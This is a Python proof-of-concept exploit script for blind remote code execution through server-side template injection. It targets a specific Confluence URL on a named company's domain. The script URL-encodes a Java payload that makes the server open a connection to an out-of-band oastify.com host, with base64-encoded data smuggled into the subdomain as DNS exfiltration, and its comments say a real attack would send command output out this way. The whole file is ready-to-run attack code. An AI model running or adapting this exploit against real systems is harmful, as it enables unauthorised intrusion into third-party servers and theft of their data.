import requests
import urllib.parse
import base64
import urllib3




# The command to execute on the target server.
# The output will be Base64 encoded and used as a subdomain for a DNS query.
command_to_run = "id"

# An external service to receive the DNS callback.
# Replace with your own or a public service like interact.sh.
exfiltration_domain = "8clb0rfzndfu0zb1v9wlc1rn4ea5yytmi.oastify.com"

# Base64 encode the command output to ensure it's a valid subdomain.
# In a real attack, you would exfiltrate the *output* of the command.
# For this PoC, we exfiltrate the command itself as a proof of concept.
encoded_command = base64.b64encode(command_to_run.encode()).decode().strip("=")

# The subdomain to look up will be the Base64 encoded command.
target_subdomain = f"{encoded_command}.{exfiltration_domain}"

# The SSTI payload uses java.net.URL to trigger a DNS lookup.
# This demonstrates code execution even if direct command execution is blocked.
payload = f"${{new java.net.URL('http://{target_subdomain}').openStream()}}"

# URL-encode the payload and construct the final URL.
encoded_payload = urllib.parse.quote(payload)
target_url = f"https://confluence.kiwi.com/plugins/servlet/no-auth/census/example?test={encoded_payload}"

print(f"[*] Sending payload to trigger blind RCE via DNS exfiltration.")
print(f"[*] Target URL: {target_url}")
print(f"[*] Check your DNS logs on '{exfiltration_domain}' for a query for a subdomain starting with '{encoded_command}'.")

try:
    # We don't expect a useful response, just that the request is made.
    # A timeout is possible if the server hangs while making the outbound request.
    requests.get(target_url, timeout=15)
    print("[+] Payload sent successfully.")
except requests.exceptions.RequestException as e:
    print(f"[+] Request failed or timed out, which is expected for a blind exploit. Check your logs. Error: {e}")

